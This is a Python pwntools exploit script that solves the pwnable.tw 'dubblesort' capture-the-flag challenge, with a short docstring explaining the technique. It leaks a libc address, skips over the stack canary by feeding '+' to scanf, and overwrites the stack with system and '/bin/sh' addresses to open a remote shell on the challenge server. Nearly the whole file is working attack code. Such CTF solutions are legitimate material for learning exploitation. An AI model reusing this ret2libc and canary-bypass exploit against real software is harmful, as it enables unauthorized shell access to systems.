#!/usr/bin/python
'''
A standard stack based buffer overflow with canary and PIE. To defeat canary, a simple trick is used.
A scanf for a %u with a non alphanumeric char(like a + or a -) leads to an error in scanf so nothing in the stack is written
Thus leaving the data already present unchanged.
'''

from pwn import *

context.log_level = 'debug'
if '-r' not in sys.argv:
    p = process('./dubblesort') 
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset_to_base = 0x1dad08
else:
    p = remote('chall.pwnable.tw', 10101)
    libc = ELF('./libc_32.so.6')
    offset_to_base = 0x1ae244

name = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"

p.sendafter("name :", name)
p.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAA")
libc_leak = u32(p.recv(4))
libc_base = libc_leak - offset_to_base

system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()



log.info("LIBC_BASE: " + hex(libc_base))


num_sort = list()

for i in xrange(24):
    num_sort.append(str(i))

num_sort.append('+')

for i in xrange(8):
    num_sort.append(str(system_addr))

for i in xrange(8):
    num_sort.append(str(bin_sh))

p.sendlineafter('sort :', str(len(num_sort)))

for i in xrange(len(num_sort)):
    p.sendlineafter('number :', num_sort[i])


p.interactive()